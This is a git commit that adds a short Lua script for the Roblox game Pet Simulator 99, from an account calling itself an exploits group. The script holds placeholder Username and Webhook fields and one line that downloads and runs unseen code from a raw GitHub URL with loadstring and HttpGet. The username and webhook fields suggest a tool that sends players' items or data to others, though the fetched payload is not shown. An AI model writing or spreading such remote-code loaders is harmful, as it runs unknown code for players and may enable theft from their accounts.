c28371cce79ffac9b9759bdffe28695576fc8e35
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-05-03 13:07:26 +0200

    Generated Pet Simulator 99 script - idk

---
+++ idk.lua
@@ -0,0 +1,6 @@
+-- Pet Sim 99 Gen V12
+-- Username: hi
+-- Username2: hi
+-- Webhook: hi
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%209"))()
